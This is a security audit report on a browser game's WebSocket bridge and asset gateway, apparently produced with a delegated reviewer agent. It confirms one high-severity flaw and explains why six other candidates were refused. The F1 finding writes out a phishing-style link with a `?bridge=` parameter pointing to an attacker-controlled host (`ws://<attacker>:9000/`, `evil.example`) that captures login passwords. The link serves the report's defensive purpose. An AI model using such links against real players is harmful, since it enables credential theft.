# Verified security sweep: bridge-web, 2026-10-16

## Context
- Scope: `BBHServer.py` (WebSocket bridge and asset gateway), `tools/host.py`, `tools/serve.py`, and
  how the browser client resolves its server addresses and renders text from other players and from
  the server.
- Trigger: owner request. First run. Commit read: `93d6304`.

## Delegation
One read-only reviewer (general-purpose agent, fresh context). Its brief:
- Pre-read: `AGENTS.md`, `docs/PROTOCOL.md`, and the README hosting sections.
- Scope: the files above, plus a grep sweep of `client/src` for HTML and URL sinks.
- Rules: the severity calibration, the disqualifications (plain HTTP alone is not a finding), and at
  most ten findings.

There were no previous reports. Verification, reproduction and the report were done by the sweep
owner.

## Verification
| Finding | Zone | Verdict | Claimed | Verified | Reservations | Proof |
|---|---|---|---|---|---|---|
| F1 `?bridge=` in a link sends the login to any server | bridge-web | VERIFIED REAL | High | High | the victim must open the crafted link and log in; saved passwords autofill | `tests/audit/sweep-bridge-web.test.mjs`, ran, fails as expected: `BRIDGE_URL` is `ws://evil.example:9000/` |
| P2 `--public` turns off the WebSocket origin check | bridge-web | OVER-RATED | Low | - | no cookies or ambient credentials; the gateway serves public data | `BBHServer.py:161` |
| P3 passwords travel over plain `ws://` | bridge-web | OVER-RATED | Low | - | needs a network-path attacker; TLS needs host setup | hardening |
| P4 services run as root | bridge-web | OVER-RATED | Low | - | hardening; only matters with another code-execution bug | hardening |
| P5 website mode without `--bridge-only` serves the repository root | bridge-web | FALSE POSITIVE | Medium | - | lens exploitability: production always passes `--bridge-only` | `tools/host.py` |
| P6 upstream game data fetched over HTTP | bridge-web | OVER-RATED | Low | - | the data is parsed as XML and shown as text | hardening |
| P7 XSS through names, chat, room or map names | bridge-web | FALSE POSITIVE | High | - | lens claim correctness: all of it is set with `textContent` | grep sweep |

## Confirmed defects

### F1: a `?bridge=` link sends the login to any server (High)
- Location: `client/src/config.js:9`. Class: output rendering in the browser (configuration from
  the URL). OWASP A06:2025, CWE-15.
- Evidence chain:
  1. `client/src/config.js:9` uses `params.get('bridge')` from the page address before the host's
     own `config.js` and before the default next to the page.
  2. The attacker posts a link such as
     `http://<the real host>:8080/play.html?bridge=ws://<attacker>:9000/`. The login sends
     `09<name>;<password>` over that socket (`client/src/net/Connection.js:160`).
  3. There is no check of scheme or host, and no Content-Security-Policy `connect-src`. `?api=` and
     `?mostwanted=` share the root cause but only change map and ranking data.
- Scenario: a griefer posts "join my room" with the link in chat or on Discord. The real site loads,
  the victim's saved login autofills, and the password goes to the griefer. The griefer's server
  relays to the real bridge, so the victim notices nothing.
- Fix approach: drop the `bridge`, `api` and `mostwanted` URL overrides. Or accept them only with
  `?debug` and only for the page's own hostname, validated with `new URL` as `community-core.js`
  does. Correct the precedence comment on line 2 to match.
- Reproduction: `tests/audit/sweep-bridge-web.test.mjs`. The attack fails on the current code; both
  guards (the host's `config.js` and the default address) pass.

## Refused or unconfirmed candidates
- P2, `--public` mode allows any page origin to open bridge sessions (`BBHServer.py:161`): refused,
  lens exploitability.
  - The game uses no cookies or ambient credentials, so another site gains nothing it could not get
    by connecting itself.
  - Hardening: an `--origin` option for public hosts.
- P3, cleartext transport: refused as a finding (plain HTTP alone is excluded by the brief).
  - Kept as hardening: the README's Caddy setup would give TLS.
  - A reverse proxy makes every player appear as 127.0.0.1, which breaks IP bans and
    `login_ips.log`. That needs a proxy-aware bridge before TLS is enabled.
- P4, the systemd unit from `tools/install_service.sh` has no `User=`: refused, lens exploitability.
  It is hardening, and only matters together with another code-execution bug.
- P5, `BBHServer.py` without `--bridge-only` serves the repository root (with `users.db`): refused,
  lens exploitability. `tools/host.py` and the README always start it with `--bridge-only`, and the
  website is served from `client/` by `tools/serve.py`.
- P6, upstream maps, constants and rankings fetched over HTTP from a fixed host: refused, lens
  existing mitigation. The client parses them as XML and renders text only.
- P7, script injection through names, chat, private messages, room names, map names or rankings:
  refused, lens claim correctness.
  - The only `innerHTML` uses are static files and numbers.
  - Text is set with `textContent`, and XML is parsed with `DOMParser`.
  - There is no `eval`, `new Function`, `document.write` or `outerHTML` in `client/src`.
- The `@bridge-ip` trust, SSRF through the asset gateway, and path traversal in `tools/serve.py`:
  refused, lens claim correctness.
  - The IP comes from the network connection and is honoured only from a loopback peer as the first
    packet.
  - The gateway has a fixed upstream allow-list and a numeric `slot_id`.
  - `SimpleHTTPRequestHandler` serves `client/` only.

## Coverage
- Read in full: `BBHServer.py`, `tools/host.py`, `tools/serve.py`, `tools/install_service.sh`,
  `client/config.js`, `client/src/config.js`, `client/src/community-core.js`.
- Read the relevant parts of `App.js`, `Connection.js`, `MapService.js`, `flash.js`, `widgets.js`,
  `lobby.js` and `Screens.js`.
- Skipped: game logic and rendering (Phaser canvas text is not HTML) and the local-only map editor.
  Both were grep-swept for sinks only.
- OWASP categories assessed: A01, A02, A05, A06. A04 was assessed partially (transport).

## Hand-off
Proposals, not changes:
- Fix F1 in `client/src/config.js`, and ship `tests/audit/sweep-bridge-web.test.mjs` moved into
  `tests/`. Only `git pull` and a browser refresh are needed.
- Hardening, in order:
  1. Bind the game server to 127.0.0.1 (`bbh-server-hunter-fix_2.py:2707` listens on all
     interfaces). On a VPS without a router, a raw client otherwise reaches it directly. This is out
     of zone: proposed as a one-line change in the server-gameplay or server-accounts sweep.
  2. Run the services as a dedicated user, not root.
  3. Make the bridge aware of a reverse proxy before adding TLS.
